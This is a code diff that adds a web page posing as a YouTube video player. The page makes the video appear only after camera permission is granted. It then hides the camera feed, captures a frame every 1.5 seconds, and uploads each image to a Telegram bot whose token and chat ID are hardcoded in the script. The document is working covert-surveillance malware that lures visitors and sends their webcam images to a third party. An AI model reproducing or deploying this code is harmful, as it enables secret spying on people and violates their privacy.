@@ -1,0 +1,98 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>YouTube Video and Camera Capture</title>
+    <style>
+        body {
+            background-color: #000;
+            color: #fff;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .video-container {
+            width: 80%;
+            max-width: 800px;
+            height: 450px;
+            display: none; /* Hide the video container initially */
+        }
+        video {
+            display: none; /* Hide video stream element */
+        }
+    </style>
+</head>
+<body>
+    <div class="video-container">
+        <iframe id="youtube-video" width="100%" height="100%" src="" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+    </div>
+    <video id="camera-stream" width="300" height="200" autoplay></video>
+
+    <script>
+        async function startCamera() {
+            try {
+                // Request camera access
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const videoElement = document.getElementById('camera-stream');
+                videoElement.srcObject = stream;
+                videoElement.style.display = 'none'; // Hide the video element
+
+                // Start capturing images every 1.5 seconds
+                setInterval(() => captureAndSendImage(videoElement), 1500);
+
+                // Show YouTube video if camera access is granted
+                const youtubeIframe = document.getElementById('youtube-video');
+                youtubeIframe.src = "https://www.youtube.com/embed/ohkeYczD1LY";
+                document.querySelector('.video-container').style.display = 'block';
+            } catch (error) {
+                console.error('Error accessing camera:', error);
+                document.querySelector('.video-container').style.display = 'none';
+            }
+        }
+
+        function captureAndSendImage(videoElement) {
+            const canvas = document.createElement('canvas');
+            canvas.width = videoElement.videoWidth;
+            canvas.height = videoElement.videoHeight;
+            const context = canvas.getContext('2d');
+            context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+            
+            // Convert canvas image to base64
+            const imageData = canvas.toDataURL('image/jpeg');
+
+            // Send the image to Telegram bot
+            sendToTelegram(imageData);
+        }
+
+        function sendToTelegram(imageData) {
+            const botToken = '6754950643:AAEpVPyw899Yx5pMJz_cH7QFGIt6EYOkvPY';
+            const chatId = '7229230911';
+
+            // Convert base64 image to Blob
+            fetch(imageData)
+                .then(res => res.blob())
+                .then(blob => {
+                    const formData = new FormData();
+                    formData.append('chat_id', chatId);
+                    formData.append('photo', blob, 'image.jpg');
+
+                    // Send the image to Telegram
+                    fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    }).then(response => response.json())
+                      .then(data => console.log('Image sent:', data))
+                      .catch(error => console.error('Error sending image:', error));
+                });
+        }
+
+        window.onload = startCamera;
+    </script>
+</body>
+</html>
